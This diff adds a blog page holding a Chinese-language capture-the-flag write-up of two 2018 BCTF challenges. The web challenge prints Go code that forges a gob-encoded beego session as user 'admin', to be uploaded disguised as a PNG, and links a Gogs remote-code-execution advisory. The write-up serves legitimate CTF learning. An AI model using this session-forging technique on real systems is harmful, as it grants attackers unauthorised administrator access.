@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="pigstars7">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="2018 BCTF部分write up">
+  <meta property="og:description" content="">
+  <meta property="og:site_name" content="IMPROVE IN HERE">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="IMPROVE IN HERE" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>IMPROVE IN HERE</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">2018 BCTF部分write up</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  All
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/pigstars7">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:879399341@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By pigstars7</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2018-12-02</span>
+            <span class="time">14:43:50</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/技术/">技术</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/CTF/">#CTF</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          
+<p>不得不感叹，自己太菜了。。。</p>
+
+<h1 id="2018-BCTF部分write-up"><a href="#2018-BCTF部分write-up" class="headerlink" title="2018 BCTF部分write up"></a>2018 BCTF部分write up</h1><h2 id="1-IRC-checkin-Misc"><a href="#1-IRC-checkin-Misc" class="headerlink" title="1.IRC checkin(Misc)"></a>1.IRC checkin(Misc)</h2><p><a href="https://imgchr.com/i/FuG8aj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuG8aj.md.png" alt="FuG8aj.md.png"></a></p>
+<p>这道题是这个比赛的签到题，就是登陆webchat.freenode.net,然后加入#BCTF就可以看到flag了。</p>
+<p><a href="https://imgchr.com/i/FuGnRP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuGnRP.md.png" alt="FuGnRP.md.png"></a></p>
+<p><img src="https://s1.ax1x.com/2018/12/02/FuGVIA.png" alt="FuGVIA.png"></p>
+<h2 id="2-checkin-web"><a href="#2-checkin-web" class="headerlink" title="2.checkin(web)"></a>2.checkin(web)</h2><p>进入页面后先注册登陆账号</p>
+<p><a href="https://imgchr.com/i/FuGePI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuGePI.md.png" alt="FuGePI.md.png"></a></p>
+<p>然后上传一张图片后，显示如下</p>
+<p><a href="https://imgchr.com/i/FuGAVH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuGAVH.md.png" alt="FuGAVH.md.png"></a></p>
+<p><a href="http://47.95.195.16:9999/hoge访问后，显示404的错误" target="_blank" rel="noopener">http://47.95.195.16:9999/hoge访问后，显示404的错误</a></p>
+<p><a href="https://imgchr.com/i/FuGFqe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuGFqe.md.png" alt="FuGFqe.md.png"></a></p>
+<p>由404界面可以看到，beego的版本是1.7.2，而最新的版本是1.10，所以查询这这间版本的相关漏洞报告，查到了以下的一个漏洞。</p>
+<p>Gogs 远程命令执行漏洞</p>
+<p><a href="https://www.anquanke.com/post/id/163575" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163575</a></p>
+<p>所以根据这个先安装相关环境，然后构造seesion，进行文件上传，获取管理员权限。</p>
+<p>根据资料伪造的seesion代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">  &quot;bytes&quot;</span><br><span class="line">  &quot;encoding/gob&quot;</span><br><span class="line">  &quot;encoding/hex&quot;</span><br><span class="line">  &quot;fmt&quot;</span><br><span class="line">  &quot;io/ioutil&quot;</span><br><span class="line">)</span><br><span class="line">func EncodeGob(obj map[interface&#123;&#125;]interface&#123;&#125;) ([]byte, error) &#123;</span><br><span class="line">  for _, v := range obj &#123;</span><br><span class="line">    gob.Register(v)</span><br><span class="line"> &#125;</span><br><span class="line">  buf := bytes.NewBuffer(nil)</span><br><span class="line">  err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line">  return buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">  var uid int64 = 1</span><br><span class="line">  obj := map[interface&#123;&#125;]interface&#123;&#125;&#123;&quot;uid&quot;: uid, &quot;username&quot;: &quot;admin&quot;&#125;</span><br><span class="line">  data, err := EncodeGob(obj)</span><br><span class="line">  if err != nil &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line"> &#125;</span><br><span class="line">  err = ioutil.WriteFile(&quot;test.png&quot;, data, 0777)</span><br><span class="line">  if err != nil &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line"> &#125;</span><br><span class="line">  edata := hex.EncodeToString(data)</span><br><span class="line">  fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行代码后，上传点上传图片，之后用burpsuite对info发包，显示如下：</p>
+<p><img src="https://s1.ax1x.com/2018/12/02/FuJrX8.png" alt="FuJrX8.png"></p>
+<p><a href="https://imgchr.com/i/FuJ5cV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuJ5cV.md.png" alt="FuJ5cV.md.png"></a></p>
+<p>点击Admin Panel这个链接，显示了flag</p>
+<p><a href="https://imgchr.com/i/FuJv1x" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/02/FuJv1x.md.png" alt="FuJv1x.md.png"></a></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
